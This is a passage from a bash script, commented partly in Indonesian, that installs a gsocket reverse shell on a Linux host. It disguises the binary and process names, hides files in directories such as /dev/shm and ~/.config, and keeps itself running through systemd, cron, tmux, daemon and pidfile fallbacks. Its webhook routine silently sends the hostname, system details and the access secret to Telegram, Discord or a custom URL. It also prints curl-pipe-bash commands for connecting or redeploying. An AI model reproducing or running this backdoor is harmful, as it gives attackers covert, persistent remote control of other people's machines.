            systemctl disable "$hn" &>/dev/null; systemctl stop "$hn" &>/dev/null
            rm -f "${sd}/${hn}.service" "${sd}/${hn}.dat" "${sd}/${hn}.rc" "${sd}/${hn}.auth" "${sd}/${hn}.pw"
            echo "Removed systemd: $hn"
        done
    done

    # Remove binary + support files dari semua kemungkinan dir
    local all_dirs=("${HOME}/.config" "${HOME}/.local/share" "/usr/local/sbin" "/usr/local/bin"
                    "/usr/sbin" "/etc" "/dev/shm" "/var/tmp" "/tmp" "${HOME}/.cache")
    for dir in "${all_dirs[@]}"; do
        for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
            rm -f "${dir}/${hn}" "${dir}/${hn}".{dat,rc,auth,pw,ctag,svc,crond,pid} 2>/dev/null
        done
        for cdn in "${CONFIG_DIR_NAME_RM[@]}"; do
            [[ -d "${dir}/${cdn}" ]] && {
                rm -f "${dir}/${cdn}/${BIN_HIDDEN_NAME_DEFAULT}"{,.dat,.rc,.auth,.pw,.ctag,.svc,.crond,.pid} 2>/dev/null
                rmdir "${dir}/${cdn}" 2>/dev/null || true
            }
        done
    done
    # Cleanup fallback dirs
    for tmpl in "${FALLBACK_DIRS_TMPL[@]}"; do
        local d; d="$(eval echo "$tmpl")"
        [[ -d "$d" ]] && rm -rf "$d" 2>/dev/null
    done

    systemctl daemon-reload &>/dev/null || true
    echo -e "${CG}Uninstall complete.${CN}"
    exit 0
}

# ──────────────────────── WEBHOOK ──────────────────────────────────────────
do_webhook() {
    local msg
    msg="$(hostname 2>/dev/null) | $(uname -rom 2>/dev/null) | GS_HOST=${MY_RELAY_HOST} gs-netcat -i -s ${GS_SECRET}"

    [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
        if [[ -n $IS_USE_CURL ]]; then
            curl -fsSL --data-urlencode "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}" &>/dev/null &
        else
            wget -qO- "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&text=${msg}" &>/dev/null &
        fi
    }

    [[ -n $GS_DISCORD_KEY ]] && {
        local data="{\"username\":\"gsocket\",\"content\":\"${msg}\"}"
        if [[ -n $IS_USE_CURL ]]; then
            curl -fsSL -H 'Content-Type: application/json' -d "$data" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}" &>/dev/null &
        else
            wget -qO- --header='Content-Type: application/json' --post-data="$data" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}" &>/dev/null &
        fi
    }

    [[ -n $GS_WEBHOOK ]] && {
        local url="${GS_WEBHOOK//\$\{GS_SECRET\}/${GS_SECRET}}"
        url="${url//\$\{GS_PASSWORD\}/}"
        if [[ -n $IS_USE_CURL ]]; then
            curl -fsSL "$url" &>/dev/null &
        else
            wget -qO- "$url" &>/dev/null &
        fi
    }
}

# ──────────────────────── CONNECT MODE (S=secret) ──────────────────────────
gs_access() {
    echo -e "Connecting to ${MY_RELAY_HOST}:${MY_RELAY_PORT}..."
    GS_HOST="$MY_RELAY_HOST" GS_PORT="$MY_RELAY_PORT" "$DSTBIN" -s "$GS_SECRET" -i
    local ret=$?
    [[ $ret -eq 61 ]] && {
        echo -e "${CR}Not connected: no server listening.${CN}"
        echo -e "Install first: X=\"${GS_SECRET}\" bash -c \"\$(curl -fsSL ${MY_URL_DEPLOY})\""
    }
    exit $ret
}

# ──────────────────────── START DAEMON ─────────────────────────────────────
gs_start() {
    [[ -n $IS_SYSTEMD ]] && return

    local kl_cmd=""
    command -v pkill   &>/dev/null && kl_cmd="pkill -0 -x"
    command -v killall &>/dev/null && kl_cmd="killall -0"
    [[ -n $kl_cmd ]] && $kl_cmd "$BIN_HIDDEN_NAME" 2>/dev/null && {
        echo -e "${CY}Already running as '${PROC_HIDDEN_NAME}'.${CN}"; return
    }

    SEC_FILE="${DSTDIR}/${BIN_HIDDEN_NAME}.dat"
    [[ ! -f $SEC_FILE ]] && write_secret "$SEC_FILE" "$GS_SECRET"

    local pid_file="${DSTDIR}/${BIN_HIDDEN_NAME}.pid"
    local started=0

    # User biasa: coba tmux + daemon + pid jika tersedia (redundan aman; recovery cek already-running)
    if [[ $UID -ne 0 ]]; then
        # 1) tmux
        if command -v tmux &>/dev/null; then
            local tmux_session="${BIN_HIDDEN_NAME}"
            if tmux has-session -t "=${tmux_session}" 2>/dev/null || \
               tmux has-session -t "${tmux_session}" 2>/dev/null; then
                IS_TMUX=1; started=1
            elif tmux new-session -d -s "$tmux_session" \
                "cd \"${HOME:-/tmp}\" 2>/dev/null || cd /tmp; exec bash \"${RCVR_FILE}\"" 2>/dev/null; then
                IS_TMUX=1; started=1
            fi
        fi

        # 2) daemon (paket daemon) jika tersedia
        if command -v daemon &>/dev/null; then
            if daemon --running -n "${BIN_HIDDEN_NAME}" -P "${DSTDIR}" 2>/dev/null; then
                IS_DAEMON=1; started=1
            elif daemon -n "${BIN_HIDDEN_NAME}" -P "${DSTDIR}" -D "${HOME:-/tmp}" -o /dev/null -E /dev/null \
                    -- bash "${RCVR_FILE}" 2>/dev/null; then
                IS_DAEMON=1; started=1
            fi
        fi

        # 3) pid via start-stop-daemon, atau background + pidfile
        if command -v start-stop-daemon &>/dev/null; then
            if start-stop-daemon --start --oknodo --background \
                --pidfile "$pid_file" --make-pidfile \
                --chdir "${HOME:-/tmp}" \
                --startas /bin/bash -- "${RCVR_FILE}" 2>/dev/null; then
                IS_PID=1; started=1
            fi
        elif [[ $started -eq 0 ]]; then
            (cd "${HOME}" 2>/dev/null || cd /tmp; bash "${RCVR_FILE}" 2>/dev/null) &
            echo $! > "$pid_file" 2>/dev/null
            chmod 600 "$pid_file" 2>/dev/null || true
            disown 2>/dev/null || true
            IS_PID=1; started=1
        else
            # Sudah jalan via tmux/daemon — tetap catat PID jika bisa
            local rp=""
            rp="$(pgrep -x "${BIN_HIDDEN_NAME}" 2>/dev/null | head -n1)"
            [[ -n $rp ]] && echo "$rp" > "$pid_file" 2>/dev/null && chmod 600 "$pid_file" 2>/dev/null
            [[ -n $rp ]] && IS_PID=1
        fi

        if [[ $started -eq 1 ]]; then
            sleep 0.8
            IS_GS_RUNNING=1
            return
        fi
        WARN "tmux/daemon/pid tidak tersedia atau gagal, fallback ke background default"
    fi

    # Default background (root, atau user tanpa method di atas)
    (cd "${HOME}" 2>/dev/null || cd /tmp; bash "${RCVR_FILE}" 2>/dev/null) &
    local bg_pid=$!
    echo "$bg_pid" > "$pid_file" 2>/dev/null
    chmod 600 "$pid_file" 2>/dev/null || true
    disown 2>/dev/null || true
    sleep 0.8
    IS_GS_RUNNING=1
}

# ──────────────────────── MAIN ─────────────────────────────────────────────
[[ -n $GS_UNDO ]] || [[ -n $GS_CLEAN ]] || [[ -n $GS_UNINSTALL ]] \
    || [[ "$1" =~ ^(uninstall|undo|clean)$ ]] && uninstall

init_dl
detect_osarch
init_tmpdir
init_dstdir

BIN_HIDDEN_NAME="${GS_BIN_HIDDEN_NAME:-${GS_HIDDEN_NAME:-$BIN_HIDDEN_NAME_DEFAULT}}"
PROC_HIDDEN_NAME="${GS_HIDDEN_NAME:-$PROC_HIDDEN_NAME_DEFAULT}"
DSTBIN="${DSTDIR}/${BIN_HIDDEN_NAME}"
AUTH_FILE="${DSTDIR}/${BIN_HIDDEN_NAME}.auth"
RCVR_FILE="${DSTDIR}/${BIN_HIDDEN_NAME}.rc"
CRON_TAG_FILE="${DSTDIR}/${BIN_HIDDEN_NAME}.ctag"
USER_SVC_FILE="${DSTDIR}/${BIN_HIDDEN_NAME}.svc"
CROND_REF_FILE="${DSTDIR}/${BIN_HIDDEN_NAME}.crond"

build_env_line

# Secret priority: S > X > existing file > generate new
GS_SECRET="${S:-${X:-}}"

if [[ -n $S ]]; then
    download_binary; install_binary
    test_binary || errexit "Binary failed"
    gs_access
fi

if [[ -z $GS_SECRET ]]; then
    SEC_FILE="${DSTDIR}/${BIN_HIDDEN_NAME}.dat"
    existing="$(read_secret "$SEC_FILE")"
    [[ -n $existing ]] && GS_SECRET="$existing"
fi

echo ""
echo -e "${CW}Installing reverse shell...${CN}"
echo -e "--> Relay  : ${CG}${MY_RELAY_HOST}:${MY_RELAY_PORT}${CN}"
echo -e "--> Binary : ${CG}${DSTBIN}${CN}"
echo ""

download_binary
install_binary
test_binary || errexit "Binary failed"

# Buat recovery script
echo -en "Creating recovery script.............................................."
create_recovery_script "$RCVR_FILE" "$DSTBIN" "${DSTDIR}/${BIN_HIDDEN_NAME}.dat" "$AUTH_FILE" "$PROC_HIDDEN_NAME"
OK_OUT

echo -en "Verifying relay connection............................................"
GS_HOST="$MY_RELAY_HOST" GS_PORT="$MY_RELAY_PORT" \
    _GSOCKET_SERVER_CHECK_SEC=8 GS_ARGS="-s ${GS_SECRET} -t" \
    "$DSTBIN" &>/dev/null
local_ret=$?
[[ $local_ret -eq 61 ]] || [[ $local_ret -eq 0 ]] && OK_OUT || {
    FAIL_OUT "(relay unreachable, ret=$local_ret)"
    WARN "Continuing — relay may be behind NAT"
}

[[ -z $GS_NOINST ]] && {
    [[ $UID -eq 0 ]] && install_system
    # install_user selalu dijalankan — user systemd + crontab = lapisan ganda
    install_user
}

[[ -z $IS_INSTALLED ]] && echo -e "${CR}WARNING: Not permanently installed. Access lost after reboot.${CN}"

do_webhook

echo ""
printf "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as '${PROC_HIDDEN_NAME}'....................................."
[[ -n $GS_NOSTART ]] && SKIP_OUT "GS_NOSTART set" || gs_start

echo ""
echo -e "  ${CG}SUCCESS${CN}"
echo -e "  --> Secret    : ${CW}${GS_SECRET}${CN}"
echo -e "  --> Connect   : ${CM}GS_HOST=${MY_RELAY_HOST} gs-netcat -i -s ${GS_SECRET}${CN}"
echo -e "  --> Or        : ${CM}S=${GS_SECRET} bash -c \"\$(curl -fsSL ${MY_URL_DEPLOY})\"${CN}"
echo -e "  --> Uninstall : ${CM}GS_UNDO=1 bash -c \"\$(curl -fsSL ${MY_URL_DEPLOY})\"${CN}"
[[ -n $IS_TMUX ]] && echo -e "  --> Tmux      : ${CM}tmux attach -t ${BIN_HIDDEN_NAME}${CN}"
[[ -n $IS_DAEMON ]] && echo -e "  --> Daemon    : ${CM}daemon --running -n ${BIN_HIDDEN_NAME} -P ${DSTDIR}${CN}"
[[ -n $IS_PID ]] && echo -e "  --> Pidfile   : ${CW}${DSTDIR}/${BIN_HIDDEN_NAME}.pid${CN}"
echo ""
